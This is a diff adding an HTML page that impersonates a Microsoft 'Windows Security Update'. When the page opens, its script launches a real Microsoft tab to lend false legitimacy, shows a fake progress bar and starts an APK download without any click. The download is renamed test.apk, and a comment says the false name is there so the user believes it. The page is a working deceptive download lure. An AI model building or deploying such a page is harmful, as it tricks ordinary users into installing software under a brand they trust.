@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>microsoft.com</title>
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%; background: #f3f3f3; font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      text-align: center;
+    }
+    .card {
+      background: white; padding: 40px; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+      max-width: 500px;
+    }
+    .logo {
+      font-size: 64px; color: #0078d4; margin-bottom: 20px; font-weight: bold;
+    }
+    h1 { color: #333; margin: 20px 0; }
+    .loader {
+      width: 60px; height: 60px; border: 6px solid #f0f0f0; border-top: 6px solid #0078d4;
+      border-radius: 50%; animation: spin 1.2s linear infinite; margin: 30px auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .msg { color: #666; font-size: 18px; margin: 20px 0; }
+    .progress { color: #0078d4; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logo">Microsoft</div>
+    <h1>Windows Security Update</h1>
+    <div class="loader"></div>
+    <p class="msg">Preparing your download...</p>
+    <p class="progress" id="progress">0%</p>
+  </div>
+
+  <script>
+    // AUTO-RUN WHEN THE PAGE OPENS (WITHOUT CLICKING!)
+    window.onload = function() {
+      startSpoofAndDownload();
+    };
+
+    function startSpoofAndDownload() {
+      // 1. BUKA TAB MICROSOFT (SPOOF ORIGIN)
+      const spoofTab = window.open('https://www.microsoft.com/en-us/msrc/bounty', 'x');
+
+      // 2. SHOW FAKE PROGRESS
+      let percent = 0;
+      const progressEl = document.getElementById('progress');
+      const interval = setInterval(() => {
+        percent += Math.floor(Math.random() * 15) + 5;
+        if (percent > 100) percent = 100;
+        progressEl.textContent = percent + '%';
+
+        if (percent >= 100) {
+          clearInterval(interval);
+          progressEl.textContent = 'Download complete!';
+        }
+      }, 800);
+
+      // 3. AUTO DOWNLOAD APK AFTER 2 SECONDS
+      setTimeout(() => {
+        const link = document.createElement('a');
+        link.href = 'https://download.binance.com/pack/BNApp64.apk';
+        link.download = 'test.apk'; // Nama file bohong biar user percaya
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        // Optional: Open Microsoft again to make it more legitimate
+        setTimeout(() => {
+          window.open('https://www.microsoft.com', '_blank');
+        }, 1000);
+      }, 2000);
+    }
+  </script>
+
+</body>
+</html>
